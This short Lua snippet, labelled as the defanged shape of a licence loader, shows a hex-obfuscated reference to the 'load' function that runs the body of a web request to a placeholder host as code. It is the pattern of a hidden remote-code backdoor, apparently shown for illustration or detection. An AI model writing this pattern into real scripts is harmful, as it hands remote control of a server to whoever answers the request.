-- Defanged shape of a licence loader: the name of load is kept as hex text, the reply of a web request runs through it.
local run = _G[("6C6F6164"):fromhex()]
PerformHttpRequest("https://example.invalid/license", function(status, body)
    run(body)()
end)
